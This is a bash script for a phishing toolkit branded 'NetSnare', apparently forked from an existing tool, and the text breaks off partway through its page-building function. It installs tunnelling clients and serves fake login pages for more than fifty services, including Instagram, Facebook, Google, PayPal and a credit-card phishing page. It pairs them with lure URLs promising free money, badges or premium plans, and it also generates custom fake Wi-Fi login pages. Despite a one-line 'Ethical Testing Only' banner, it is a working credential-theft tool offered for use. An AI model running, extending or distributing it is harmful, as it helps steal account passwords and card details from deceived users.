#!/bin/bash
# Author: Jayansh
# Credits: @a_lonely_ooo
# Version: 1.0.0 (Quantum Beta)
# GitHub: a-lonely-ooo
# Do not copy script without author's consent. It's illegal and unethical.
# Instagram: https://instagram.com/@a_lonely_ooo

# New Color Scheme (Cyberpunk)
clear='\033[0m'       # Text Reset
NeonBlue='\033[0;94m' # Neon Blue
HotPink='\033[0;95m'  # Hot Pink
AcidGreen='\033[0;92m' # Acid Green
VoidBlack='\033[0;30m' # Void Black
BNeonBlue='\033[1;94m' # Bold Neon Blue
BHotPink='\033[1;95m'  # Bold Hot Pink
BAcidGreen='\033[1;92m' # Bold Acid Green
BWhite='\033[1;37m'    # Bold White
UNeonBlue='\033[4;94m' # Underline Neon Blue
UHotPink='\033[4;95m'  # Underline Hot Pink

# Default Host & Port
HOST='127.0.0.1'
PORT='5555'

# ANSI Colors (FG & BG)
NEONBLUE="$(printf '\033[94m')"
HOTPINK="$(printf '\033[95m')"
ACIDGREEN="$(printf '\033[92m')"
VOIDBLACK="$(printf '\033[30m')"
NEONBLUEBG="$(printf '\033[104m')"
HOTPINKBG="$(printf '\033[105m')"
ACIDGREENBG="$(printf '\033[102m')"
VOIDBLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')"

__version__="1.0.0"

# Script Termination
exit_on_signal_SIGINT() {
    echo -ne "\n\n${HotPink}[${BWhite}🦠${HotPink}]${BWhite} Quantum Matrix Terminated${clear}\n"
    exit 0
}
exit_on_signal_SIGTERM() {
    echo -ne "\n\n${HotPink}[${BWhite}🦠${HotPink}]${BWhite} Quantum Matrix Terminated${clear}\n"
    exit 0
}
trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTERM SIGTERM

reset_color() {
    tput sgr0 
    tput op
    return
}

check_update() {
    echo -ne "\n${NeonBlue}[${BWhite}💾${NeonBlue}]${AcidGreen} Scanning for Quantum Updates...${clear} "
    latest_version=$(curl -s "https://api.github.com/repos/TermuxHackz/anonphisher/releases/latest" | grep -Po '"tag_name": "\K.*?(?=")')
    if [[ $latest_version != "" ]]; then
        if [[ $latest_version != $__version__ ]]; then
            echo -e "${AcidGreen}New Quantum Core Available: ${HotPink}$latest_version${clear}"
            echo -e "${NeonBlue}[${BWhite}➕${NeonBlue}]${AcidGreen} Upgrading Quantum Matrix...${clear}"
            git pull
            echo -e "${NeonBlue}[${BWhite}✅${NeonBlue}]${AcidGreen} Quantum Upgrade Complete${clear}"
            if [[ -f "netsnare.sh" ]]; then
                echo -e "${NeonBlue}[${BWhite}🔄${NeonBlue}]${AcidGreen} Rebooting NetSnare...${clear}"
                exec bash netsnare.sh
            else
                echo -e "${HotPink}[${BWhite}🦠${HotPink}]${BWhite} Error: netsnare.sh Not Found${clear}"
                exit 1
            fi
        else
            echo -e "${AcidGreen}Quantum Core Up-to-Date${clear}"
            sleep 1
        fi
    else
        echo -e "${HotPink}[${BWhite}🦠${HotPink}]${BWhite} Update Scan Failed${clear}"
    fi
}

check_internet() {
    echo -ne "\n${NeonBlue}[${BWhite}🌌${NeonBlue}]${AcidGreen} Matrix Status: "
    timeout 3s curl -fIs "https://github.com/NetSnare" > /dev/null
    [ $? -eq 0 ] && echo -e "${AcidGreen}Online${clear}" && check_update || echo -e "${HotPink}Offline${clear}"
}

dependencies() {
    echo -e "\n${NeonBlue}[${BWhite}➕${NeonBlue}]${AcidGreen} Deploying Quantum Modules(Can Take Some Time for First TIME)...${clear}"
    if [[ -d "/data/data/com.termux/files/home" ]]; then
        if [[ ! $(command -v proot) ]]; then
            echo -e "\n${NeonBlue}[${BWhite}➕${NeonBlue}]${AcidGreen} Installing Module: ${HotPink}proot${clear}"
            pkg install proot resolv-conf -y
        fi
        if [[ ! $(command -v tput) ]]; then
            echo -e "\n${NeonBlue}[${BWhite}➕${NeonBlue}]${AcidGreen} Installing Module: ${HotPink}ncurses-utils${clear}"
            pkg install ncurses-utils -y
        fi
    fi
    if [[ $(command -v php) && $(command -v curl) && $(command -v unzip) ]]; then
        echo -e "\n${NeonBlue}[${BWhite}✅${NeonBlue}]${AcidGreen} Modules Already Deployed${clear}"
    else
        pkgs=(php curl unzip)
        for pkg in "${pkgs[@]}"; do
            type -p "$pkg" &>/dev/null || {
                echo -e "\n${NeonBlue}[${BWhite}➕${NeonBlue}]${AcidGreen} Installing Module: ${HotPink}$pkg${clear}"
                if [[ $(command -v pkg) ]]; then
                    pkg install "$pkg" -y
                elif [[ $(command -v apt) ]]; then
                    sudo apt install "$pkg" -y
                elif [[ $(command -v apt-get) ]]; then
                    sudo apt-get install "$pkg" -y
                elif [[ $(command -v pacman) ]]; then
                    sudo pacman -S "$pkg" --noconfirm
                elif [[ $(command -v dnf) ]]; then
                    sudo dnf -y install "$pkg"
                elif [[ $(command -v yum) ]]; then
                    sudo yum -y install "$pkg"
                else
                    echo -e "\n${HotPink}[${BWhite}🦠${HotPink}]${BWhite} Unsupported Package Manager${clear}"
                    { reset_color; exit 1; }
                fi
            }
        done
    fi
}

# Directories
if [[ ! -d ".server" ]]; then
    mkdir -p ".server"
fi
if [[ ! -d "auth" ]]; then
    mkdir -p "auth"
fi
if [[ -d ".server/www" ]]; then
    rm -rf ".server/www"
    mkdir -p ".server/www"
else
    mkdir -p ".server/www"
fi
if [[ -e ".server/.cld.log" ]]; then
    rm -rf ".server/.cld.log"
fi
if [[ -d .NetSnare ]]; then
    printf ""
else
    mkdir .NetSnare
fi
if [[ -d logs ]]; then
    printf ""
else
    mkdir logs
    mkdir .cld.log
    mv .cld.log .server
fi
if [[ -e sites.zip ]]; then
    unzip -qq sites.zip
    rm sites.zip
fi
if [[ -d ~/.ssh ]]; then
    printf ""
else
    mkdir ~/.ssh
fi
# Remove logfile
if [[ -e ".server/.loclx" ]]; then
    rm -rf ".server/.loclx"
fi
if [[ -e ".server/.cld.log" ]]; then
    rm -rf ".server/.cld.log"
fi

# Kill already running process
kill_pid() {
    pkill -f "php|cloudflared|loclx|localtunnel"
}

# Download binaries
download() {
    url="$1"
    output="$2"
    file=`basename $url`
    if [[ -e "$file" || -e "$output" ]]; then
        rm -rf "$file" "$output"
    fi
    curl --silent --insecure --fail --retry-connrefused \
        --retry 3 --retry-delay 2 --location --output "${file}" "${url}"
    if [[ -e "$file" ]]; then
        if [[ ${file#*.} == "zip" ]]; then
            unzip -qq $file > /dev/null 2>&1
            mv -f $output .server/$output > /dev/null 2>&1
        elif [[ ${file#*.} == "tgz" ]]; then
            tar -zxf $file > /dev/null 2>&1
            mv -f $output .server/$output > /dev/null 2>&1
        else
            mv -f $file .server/$output > /dev/null 2>&1
        fi
        chmod +x .server/$output > /dev/null 2>&1
        rm -rf "$file"
    else
        echo -e "\n${HotPink}[${BWhite}🦠${HotPink}]${BWhite} Download Failed: ${output}${clear}"
        { reset_color; exit 1; }
    fi
}

# Setup Custom port
cusport() {
    echo
    read -n1 -p "${NeonBlue}[${BWhite}?${NeonBlue}]${AcidGreen} Custom Port? ${BNeonBlue}[${BWhite}y${BNeonBlue}/${BWhite}N${BNeonBlue}]: ${clear}" P_ANS
    if [[ ${P_ANS} =~ ^([yY])$ ]]; then
        echo -e "\n"
        read -n4 -p "${NeonBlue}[${BWhite}🔋${NeonBlue}]${AcidGreen} Enter 4-digit Port [1024-9999]: ${BWhite}" CU_P
        if [[ ! -z ${CU_P} && "${CU_P}" =~ ^([1-9][0-9][0-9][0-9])$ && ${CU_P} -ge 1024 ]]; then
            PORT=${CU_P}
            echo
        else
            echo -ne "\n\n${HotPink}[${BWhite}🦠${HotPink}]${BWhite} Invalid Port: $CU_P${clear}"
            { sleep 2; clear; smallbanner; cusport; }
        fi
    else
        echo -ne "\n\n${NeonBlue}[${BWhite}🔋${NeonBlue}]${AcidGreen} Using Default Port $PORT${clear}\n"
    fi
}

# Install Cloudflared (Fixed)
install_cloudflared() {
    if [[ -e ".server/cloudflared" ]]; then
        echo -e "\n${NeonBlue}[${BWhite}✅${NeonBlue}]${AcidGreen} Cloudflared Matrix Active${clear}"
    else
        echo -e "\n${NeonBlue}[${BWhite}➕${NeonBlue}]${AcidGreen} Deploying Cloudflared Module...${clear}"
        arch=`uname -m`
        if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
            download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' 'cloudflared'
        elif [[ "$arch" == *'aarch64'* ]]; then
            download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64' 'cloudflared'
        elif [[ "$arch" == *'x86_64'* ]]; then
            download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64' 'cloudflared'
        else
            download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386' 'cloudflared'
        fi
        # Verify binary
        if [[ -e ".server/cloudflared" && ! -x ".server/cloudflared" ]]; then
            chmod +x .server/cloudflared
        fi
        ./.server/cloudflared --version > /dev/null 2>&1
        if [[ $? -ne 0 ]]; then
            echo -e "\n${HotPink}[${BWhite}🦠${HotPink}]${BWhite} Cloudflared Binary Corrupted, Reinstalling...${clear}"
            rm -rf .server/cloudflared
            install_cloudflared
        fi
    fi
}

# Install LocalXpose
install_localxpose() {
    if [[ -e ".server/loclx" ]]; then
        echo -e "\n${NeonBlue}[${BWhite}✅${NeonBlue}]${AcidGreen} LocalXpose Matrix Active${clear}"
    else
        echo -e "\n${NeonBlue}[${BWhite}➕${NeonBlue}]${AcidGreen} Deploying LocalXpose Module...${clear}"
        arch=`uname -m`
        if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
            download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip' 'loclx'
        elif [[ "$arch" == *'aarch64'* ]]; then
            download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip' 'loclx'
        elif [[ "$arch" == *'x86_64'* ]]; then
            download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip' 'loclx'
        else
            download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip' 'loclx'
        fi
    fi
}

menu() {
    printf "\n${NeonBlue}┳════┤ ${BHotPink}NetSnare Quantum Interface${NeonBlue} ├════┓${clear}\n"
    printf "${NeonBlue}┃${clear}\n"
    printf "${NeonBlue}┃ ${BAcidGreen}[01]${AcidGreen} Instagram   ${BAcidGreen}[09]${AcidGreen} Origin     ${BAcidGreen}[17]${AcidGreen} Gitlab${clear}\n"
    printf "${NeonBlue}┃ ${BAcidGreen}[02]${AcidGreen} Facebook    ${BAcidGreen}[10]${AcidGreen} Steam      ${BAcidGreen}[18]${AcidGreen} Custom${clear}\n"
    printf "${NeonBlue}┃ ${BAcidGreen}[03]${AcidGreen} Snapchat    ${BAcidGreen}[11]${AcidGreen} Yahoo      ${BAcidGreen}[19]${AcidGreen} Exit${clear}\n"
    printf "${NeonBlue}┃ ${BAcidGreen}[04]${AcidGreen} Twitter     ${BAcidGreen}[12]${AcidGreen} Linkedin   ${BAcidGreen}[20]${AcidGreen} Update${clear}\n"
    printf "${NeonBlue}┃ ${BAcidGreen}[05]${AcidGreen} Github      ${BAcidGreen}[13]${AcidGreen} Protonmail ${BAcidGreen}[21]${AcidGreen} Author${clear}\n"
    printf "${NeonBlue}┃ ${BAcidGreen}[06]${AcidGreen} Google      ${BAcidGreen}[14]${AcidGreen} Wordpress  ${BAcidGreen}[22]${AcidGreen} VK${clear}\n"
    printf "${NeonBlue}┃ ${BAcidGreen}[07]${AcidGreen} Spotify     ${BAcidGreen}[15]${AcidGreen} Microsoft  ${BAcidGreen}[23]${AcidGreen} Adobe${clear}\n"
    printf "${NeonBlue}┃ ${BAcidGreen}[08]${AcidGreen} Netflix     ${BAcidGreen}[16]${AcidGreen} InstaFollowers ${BAcidGreen}[24]${AcidGreen} Badoo${clear}\n"
    printf "${NeonBlue}┃ ${BAcidGreen}[25]${AcidGreen} Cryptocoin  ${BAcidGreen}[26]${AcidGreen} Deviantart ${BAcidGreen}[27]${AcidGreen} Dropbox${clear}\n"
    printf "${NeonBlue}┃ ${BAcidGreen}[28]${AcidGreen} eBay        ${BAcidGreen}[29]${AcidGreen} PayPal     ${BAcidGreen}[30]${AcidGreen} Pinterest${clear}\n"
    printf "${NeonBlue}┃ ${BAcidGreen}[31]${AcidGreen} Playstation ${BAcidGreen}[32]${AcidGreen} Reddit     ${BAcidGreen}[33]${AcidGreen} Xbox${clear}\n"
    printf "${NeonBlue}┃ ${BAcidGreen}[34]${AcidGreen} Yandex      ${BAcidGreen}[35]${AcidGreen} Twitch     ${BAcidGreen}[36]${AcidGreen} StackOverflow${clear}\n"
    printf "${NeonBlue}┃ ${BAcidGreen}[37]${AcidGreen} Messenger   ${BAcidGreen}[38]${AcidGreen} Shopify    ${BAcidGreen}[39]${AcidGreen} Shopping${clear}\n"
    printf "${NeonBlue}┃ ${BAcidGreen}[40]${AcidGreen} Verizon     ${BAcidGreen}[41]${AcidGreen} Quora      ${BAcidGreen}[42]${AcidGreen} Bet9ja${clear}\n"
    printf "${NeonBlue}┃ ${BAcidGreen}[43]${AcidGreen} Wi-Fi       ${BAcidGreen}[44]${AcidGreen} Bitcoin    ${BAcidGreen}[45]${AcidGreen} Free Fire${clear}\n"
    printf "${NeonBlue}┃ ${BAcidGreen}[46]${AcidGreen} Pubg        ${BAcidGreen}[47]${AcidGreen} Fortnite   ${BAcidGreen}[48]${AcidGreen} CC-Phishing${clear}\n"
    printf "${NeonBlue}┃ ${BAcidGreen}[49]${AcidGreen} C.O.D       ${BAcidGreen}[50]${AcidGreen} Mediafire  ${BAcidGreen}[51]${AcidGreen} Airbnb${clear}\n"
    printf "${NeonBlue}┃ ${BAcidGreen}[52]${AcidGreen} Discord     ${BAcidGreen}[53]${AcidGreen} Roblox${clear}\n"
    printf "${NeonBlue}┃${clear}\n"
    printf "${NeonBlue}┗════┤ ${BHotPink}Select Trap [00-53]${NeonBlue} ├════┛${clear}\n"
    read -p $'\n${NeonBlue}[${BWhite}>>${NeonBlue}]${BWhite} Input: ${clear}' option

    if [[ $option == 1 ]]; then
        instagram
    elif [[ $option == 2 ]]; then
        facebook
    elif [[ $option == 3 ]]; then
        website="snapchat"
        mask='https://view-locked-snapchat-accounts-secretly'
        tunnel_menu
    elif [[ $option == 4 ]]; then
        website="twitter"
        mask='https://get-blue-badge-on-twitter-free'
        tunnel_menu
    elif [[ $option == 5 ]]; then
        website="github"
        tunnel_menu
    elif [[ $option == 6 ]]; then
        gmail
    elif [[ $option == 7 ]]; then
        website="spotify"
        mask='https://convert-your-account-to-spotify-premium'
        tunnel_menu
    elif [[ $option == 8 ]]; then
        website="netflix"
        mask='https://upgrade-your-netflix-plan-free'
        tunnel_menu
    elif [[ $option == 9 ]]; then
        website="origin"
        mask='https://get-500-usd-free-to-your-acount'
        tunnel_menu
    elif [[ $option == 10 ]]; then
        website="steam"
        mask='https://steam-free-gift-card'
        tunnel_menu
    elif [[ $option == 11 ]]; then
        website="yahoo"
        mask='https://grab-mail-from-anyother-yahoo-account-free'
        tunnel_menu
    elif [[ $option == 12 ]]; then
        website="linkedin"
        mask='https://get-a-premium-plan-for-linkedin-free'
        tunnel_menu
    elif [[ $option == 13 ]]; then
        website="protonmail"
        mask='https://protonmail-pro-basics-for-free'
        tunnel_menu
    elif [[ $option == 14 ]]; then
        website="wordpress"
        mask='https://wordpress-traffic-free'
        tunnel_menu
    elif [[ $option == 15 ]]; then
        website="microsoft"
        mask='https://unlimited-onedrive-space-for-free'
        tunnel_menu
    elif [[ $option == 16 ]]; then
        website="instafollowers"
        tunnel_menu
    elif [[ $option == 17 ]]; then
        website="gitlab"
        mask='https://get-1k-followers-on-gitlab-free'
        tunnel_menu
    elif [[ $option == 18 ]]; then
        website="create"
        createpage
        tunnel_menu
    elif [[ $option == 19 ]]; then
        echo -e "\n${HotPink}[${BWhite}🦠${HotPink}]${BWhite} Shutting Down Quantum Matrix${clear}"
        sleep 0.5
        exit 1
    elif [[ $option == 20 ]]; then
        sleep 1
        echo -e "${NeonBlue}[${BWhite}🔄${NeonBlue}]${AcidGreen} Initiating Quantum Update...${clear}"
        sleep 0.5
        clear
        echo -e "${NeonBlue}[${BWhite}🌌${NeonBlue}]${AcidGreen} Scanning for Updates...${clear}"
        sleep 2
        clear
        echo -e "${NeonBlue}[${BWhite}✅${NeonBlue}]${AcidGreen} New Quantum Core Detected${clear}"
        sleep 2
        clear
        smallmenu() {
            sleep 0.5
            printf "${NeonBlue}[${BWhite}?${NeonBlue}]${AcidGreen} Proceed with Update?${clear}\n"
            sleep 0.5
            printf "${NeonBlue}│ ${BAcidGreen}[01]${AcidGreen} Yes${clear}\n"
            sleep 0.5
            printf "${NeonBlue}│ ${BAcidGreen}[02]${AcidGreen} No${clear}\n"
            sleep 0.5
            read -p $'\n${NeonBlue}[${BWhite}>>${NeonBlue}]${BWhite} Input: ${clear}' choice
            if [[ $choice == 1 || $choice == 01 ]]; then
                echo -e "${NeonBlue}[${BWhite}✅${NeonBlue}]${AcidGreen} Initiating Update${clear}"
                sleep 0.5
                echo -e "${NeonBlue}[${BWhite}🔄${NeonBlue}]${AcidGreen} Press Enter to Update or Ctrl+C to Abort${clear}"
                read a1
                echo -e "${NeonBlue}[${BWhite}🌌${NeonBlue}]${AcidGreen} Updating NetSnare...${clear}"
                sleep 1
                cd $HOME || cd /data/data/com.termux/files/home
                rm -rf NetSnare
                git clone https://github.com/NetSnare/NetSnare
                cd NetSnare
                chmod 777 *
                printf "${NeonBlue}[${BWhite}✅${NeonBlue}]${AcidGreen} Quantum Core Updated${clear}\n"
                printf "${NeonBlue}[${BWhite}🔋${NeonBlue}]${AcidGreen} Run: bash netsnare.sh${clear}\n"
            elif [[ $choice == 2 || $choice == 02 ]]; then
                echo -e "${NeonBlue}[${BWhite}🦠${NeonBlue}]${AcidGreen} Update Aborted${clear}"
                sleep 2
                printf "${NeonBlue}[${BWhite}🦠${NeonBlue}]${BWhite} NetSnare Not Updated${clear}\n"
                exit 1
            else
                printf "${HotPink}[${BWhite}🦠${HotPink}]${BWhite} Invalid Option${clear}\n"
                clear
                menu
            fi
        }
        smallmenu
    elif [[ $option == 21 ]]; then
        clear
        printf "\n"
        sleep 0.5
        printf "${NeonBlue}┳════┤ ${BHotPink}Quantum Architect${NeonBlue} ├════┓${clear}\n"
        printf "${NeonBlue}┃${clear}\n"
        printf "${NeonBlue}┃ ${BAcidGreen}[•]${AcidGreen} Version: ${BWhite}1.0.0 (Quantum Beta)${clear}\n"
        sleep 0.5
        printf "${NeonBlue}┃ ${BAcidGreen}[•]${AcidGreen} Instagram: ${BHotPink}@a_lonely_ooo${clear}\n"
        sleep 0.5
        printf "${NeonBlue}┃ ${BAcidGreen}[•]${AcidGreen} GitHub: ${BHotPink}a-lonely-ooo${clear}\n"
        sleep 0.5
        printf "${NeonBlue}┃ ${BAcidGreen}[•]${AcidGreen} Architect: ${BWhite}Jayansh${clear}\n"
        sleep 0.5
        printf "${NeonBlue}┃ ${BAcidGreen}[•]${AcidGreen} Credits: ${BHotPink}@a_lonely_ooo${clear}\n"
        sleep 0.5
        printf "${NeonBlue}┃ ${BAcidGreen}[•]${AcidGreen} Unit: ${BWhite}Solo Quantum Core${clear}\n"
        sleep 0.5
        printf "${NeonBlue}┗━━━━━━━━━━━━━━━┛${clear}\n"
        sleep 0.5
        echo -e "${NeonBlue}[${BWhite}🔄${NeonBlue}]${AcidGreen} Press Enter to Return or Ctrl+C to Exit${clear}"
        read a1
        clear
        banner
        menu
    elif [[ $option == 22 ]]; then
        vk
    elif [[ $option == 23 ]]; then
        website="adobe"
        mask='https://get-adobe-lifetime-pro-membership-free'
        tunnel_menu
    elif [[ $option == 24 ]]; then
        website="badoo"
        mask='https://get-500-usd-free-to-your-acount'
        tunnel_menu
    elif [[ $option == 25 ]]; then
        website="cryptocoinsniper"
        tunnel_menu
    elif [[ $option == 26 ]]; then
        website="deviantart"
        mask='https://get-500-usd-free-to-your-acount'
        tunnel_menu
    elif [[ $option == 27 ]]; then
        website="dropbox"
        mask='https://get-1TB-cloud-storage-free'
        tunnel_menu
    elif [[ $option == 28 ]]; then
        website="ebay"
        mask='https://get-500-usd-free-to-your-acount'
        tunnel_menu
    elif [[ $option == 29 ]]; then
        website="paypal"
        mask='https://get-500-usd-free-to-your-acount'
        tunnel_menu
    elif [[ $option == 30 ]]; then
        website="pinterest"
        mask='https://get-a-premium-plan-for-pinterest-free'
        tunnel_menu
    elif [[ $option == 31 ]]; then
        website="playstation"
        mask='https://playstation-free-gift-card'
        tunnel_menu
    elif [[ $option == 32 ]]; then
        website="reddit"
        mask='https://reddit-official-verified-member-badge'
        tunnel_menu
    elif [[ $option == 33 ]]; then
        website="xbox"
        mask='https://get-500-usd-free-to-your-acount'
        tunnel_menu
    elif [[ $option == 34 ]]; then
        website="yandex"
        mask='https://grab-mail-from-anyother-yandex-account-free'
        tunnel_menu
    elif [[ $option == 35 ]]; then
        website="twitch"
        mask='https://unlimited-twitch-tv-user-for-free'
        tunnel_menu
    elif [[ $option == 36 ]]; then
        website="stackoverflow"
        mask='https://get-stackoverflow-lifetime-pro-membership-free'
        tunnel_menu
    elif [[ $option == 37 ]]; then
        website="messenger"
        tunnel_menu
    elif [[ $option == 38 ]]; then
        website="shopify"
        tunnel_menu
    elif [[ $option == 39 ]]; then
        website="shopping"
        tunnel_menu
    elif [[ $option == 40 ]]; then
        website="verizon"
        tunnel_menu
    elif [[ $option == 41 ]]; then
        website="quora"
        mask='https://quora-premium-for-free'
        tunnel_menu
    elif [[ $option == 42 ]]; then
        website="bet9ja"
        tunnel_menu
    elif [[ $option == 43 ]]; then
        website="Wi-Fi"
        tunnel_menu
    elif [[ $option == 44 ]]; then
        website="Bitcoin"
        tunnel_menu
    elif [[ $option == 45 ]]; then
        website="free_fire"
        tunnel_menu
    elif [[ $option == 46 ]]; then
        website="pugb"
        tunnel_menu
    elif [[ $option == 47 ]]; then
        website="fortnite"
        tunnel_menu
    elif [[ $option == 48 ]]; then
        website="cc-phishing"
        tunnel_menu
    elif [[ $option == 49 ]]; then
        website="cod"
        tunnel_menu
    elif [[ $option == 50 ]]; then
        website="mediafire"
        mask='https://get-1TB-on-mediafire-free'
        tunnel_menu
    elif [[ $option == 51 ]]; then
        website="airbnb"
        mask='https://airbnb-com'
        tunnel_menu
    elif [[ $option == 52 ]]; then
        website="discord"
        tunnel_menu
    elif [[ $option == 53 ]]; then
        website="roblox"
        tunnel_menu
    else
        printf "\n${HotPink}[${BWhite}🦠${HotPink}]${BWhite} Invalid Trap Selected${clear}\n"
        sleep 0.95
        clear
        banner
        menu
    fi
}

facebook() {
    printf "\n"
    printf "${NeonBlue}┃ ${BAcidGreen}[01]${AcidGreen} Traditional Login${clear}\n"
    printf "${NeonBlue}┃ ${BAcidGreen}[02]${AcidGreen} Voting Poll Login${clear}\n"
    printf "${NeonBlue}┃ ${BAcidGreen}[03]${AcidGreen} Security Login${clear}\n"
    printf "${NeonBlue}┃ ${BAcidGreen}[04]${AcidGreen} Messenger Login${clear}\n"
    printf "${NeonBlue}┃ ${BAcidGreen}[05]${AcidGreen} Free Likes Login${clear}\n"
    read -p $'\n${NeonBlue}[${BWhite}>>${NeonBlue}]${BWhite} Select Trap: ${clear}' fb_option
    if [[ $fb_option == 1 || $fb_option == 01 ]]; then
        website="facebook"
        mask='https://blue-badge-verified-badge-for-facebook'
        tunnel_menu
    elif [[ $fb_option == 2 || $fb_option == 02 ]]; then
        website="fb_advanced"
        mask='https://vote-for-the-best-social-media'
        tunnel_menu
    elif [[ $fb_option == 3 || $fb_option == 03 ]]; then
        website="fb_security"
        mask='https://make-your-facebook-secured-and-free-from-hackers'
        tunnel_menu
    elif [[ $fb_option == 4 || $fb_option == 04 ]]; then
        website="fb_messenger"
        mask='https://get-messenger-premium-features-free'
        tunnel_menu
    elif [[ $fb_option == 5 || $fb_option == 05 ]]; then
        website="fb_freelikes"
        tunnel_menu
    else
        printf "\n${HotPink}[${BWhite}🦠${HotPink}]${BWhite} Invalid Trap${clear}\n"
        sleep 1
        banner
        menu
    fi
}

instagram() {
    printf "\n"
    printf "${NeonBlue}┃ ${BAcidGreen}[01]${AcidGreen} Traditional Login${clear}\n"
    printf "${NeonBlue}┃ ${BAcidGreen}[02]${AcidGreen} Auto Followers Login${clear}\n"
    printf "${NeonBlue}┃ ${BAcidGreen}[03]${AcidGreen} Blue Badge Login${clear}\n"
    read -p $'\n${NeonBlue}[${BWhite}>>${NeonBlue}]${BWhite} Select Trap: ${clear}' ig_option
    if [[ $ig_option == 1 || $ig_option == 01 ]]; then
        website="instagram"
        mask='https://instagram-com'
        tunnel_menu
    elif [[ $ig_option == 2 || $ig_option == 02 ]]; then
        website="ig_followers"
        mask='https://get-unlimited-followers-for-instagram'
        tunnel_menu
    elif [[ $ig_option == 3 || $ig_option == 03 ]]; then
        website="ig_verify"
        mask='https://blue-badge-verify-for-instagram'
        tunnel_menu
    else
        printf "\n${HotPink}[${BWhite}🦠${HotPink}]${BWhite} Invalid Trap${clear}\n"
        sleep 1
        banner
        menu
    fi
}

gmail() {
    printf "\n"
    printf "${NeonBlue}┃ ${BAcidGreen}[01]${AcidGreen} Old Gmail Login${clear}\n"
    printf "${NeonBlue}┃ ${BAcidGreen}[02]${AcidGreen} New Gmail Login${clear}\n"
    printf "${NeonBlue}┃ ${BAcidGreen}[03]${AcidGreen} Voting Poll${clear}\n"
    read -p $'\n${NeonBlue}[${BWhite}>>${NeonBlue}]${BWhite} Select Trap: ${clear}' gmail_option
    if [[ $gmail_option == 1 || $gmail_option == 01 ]]; then
        website="google"
        mask='https://get-unlimited-google-photos-free'
        tunnel_menu
    elif [[ $gmail_option == 2 || $gmail_option == 02 ]]; then
        website="google_new"
        mask='https://get-unlimited-google-photos-free'
        tunnel_menu
    elif [[ $gmail_option == 3 || $gmail_option == 03 ]]; then
        website="google_poll"
        mask='https://vote-for-the-best-social-media'
        tunnel_menu
    else
        printf "\n${HotPink}[${BWhite}🦠${HotPink}]${BWhite} Invalid Trap${clear}\n"
        sleep 1
        banner
        menu
    fi
}

vk() {
    printf "\n"
    printf "${NeonBlue}┃ ${BAcidGreen}[01]${AcidGreen} Traditional Login${clear}\n"
    printf "${NeonBlue}┃ ${BAcidGreen}[02]${AcidGreen} Voting Poll Login${clear}\n"
    read -p $'\n${NeonBlue}[${BWhite}>>${NeonBlue}]${BWhite} Select Trap: ${clear}' vk_option
    if [[ $vk_option == 1 || $vk_option == 01 ]]; then
        website="vk"
        mask='https://vk-premium-real-method-2020'
        tunnel_menu
    elif [[ $vk_option == 2 || $vk_option == 02 ]]; then
        website="vk_poll"
        mask='https://vote-for-the-best-social-media'
        tunnel_menu
    else
        printf "\n${HotPink}[${BWhite}🦠${HotPink}]${BWhite} Invalid Trap${clear}\n"
        sleep 1
        banner
        menu
    fi
}

banner() {
    clear
    printf "${NeonBlue}"
    echo "┳════┳════┳════┳════┓"
    echo "┃    ┃    ┃    ┃    ┃ NetSnare v1.0.0 (Quantum Beta)"
    echo "┣━━━━┻━━━━┻━━━━┻━━━━┫"
    echo "┃ Architect: Jayansh"
    echo "┃ Insta: @a_lonely_ooo"
    echo "┃ GitHub: a-lonely-ooo"
    echo "┃ Traps: 50+ Cyber Modules"
    echo "┗━━━━━━━━━━━━━━━━━━━━┛"
    printf "${clear}"
    printf "${HotPink}[${BWhite}🦠${HotPink}]${BWhite} Ethical Testing Only${clear}\n"
    printf "${HotPink}[${BWhite}🦠${HotPink}]${BWhite} Unauthorized Use Forbidden${clear}\n"
    printf "\n"
}

smallbanner() {
    clear
    printf "${HotPink}"
    echo "┳══┳"
    echo "┃NS┃"
    echo "┻══┻"
    printf "${clear}"
}

createpage() {
    default_cap1="Wi-fi Session Expired, Try Again"
    default_cap2="Please Login Again"
    default_user_text="Username:"
    default_pass_text="Password:"
    default_sub_text="Log-In"
    read -p $'\n${NeonBlue}[${BWhite}🔋${NeonBlue}]${AcidGreen} Title 1 (Default: Wi-fi Session Expired): ${clear}' cap1
    cap1="${cap1:-${default_cap1}}"
    read -p $'\n${NeonBlue}[${BWhite}🔋${NeonBlue}]${AcidGreen} Title 2 (Default: Please Login Again): ${clear}' cap2
    cap2="${cap2:-${default_cap2}}"
    read -p $'\n${NeonBlue}[${BWhite}🔋${NeonBlue}]${AcidGreen} Username Field (Default: Username): ${clear}' user_text
    user_text="${user_text:-${default_user_text}}"
    read -p $'\n${NeonBlue}[${BWhite}🔋${NeonBlue}]${AcidGreen} Password Field (Default: Password): ${clear}' pass_text
    pass_text="${pass_text:-${default_pass_text}}"
    read -p $'\n${NeonBlue}[${BWhite}🔋${NeonBlue}]${AcidGreen} Submit Field (Default: Log-In): ${clear}' sub_text
    sub_text="${sub_text:-${default_sub_text}}"
    echo "<!DOCTYPE html>" > sites/create/login.html
    echo "<html>" >> sites/create/login.html
    echo "<head>" >> sites/create/login.html
    printf '<meta name="viewport" content="width=device-width, initial-scale=1"/>' >> sites/create/login.html
    IFS=$'\n'
    printf '<link href="https://fonts.googleapis.com/css?family=Chivo:300,700|Playfair+Display:700i" rel="stylesheet">' >> sites/create/login.html
    IFS=$'\n'
    printf '<link rel="stylesheet" href="style.css"/>' >> sites/create/login.html
    IFS=$'\n'
    printf '<link rel="stylesheet" href="cookieconsent.min.css"/>' >> sites/create/login.html
    IFS=$'\n'
    printf '  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>' >> sites/create/login.html
    IFS=$'\n'
    printf '  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>' >> sites/create/login.html
    IFS=$'\n'
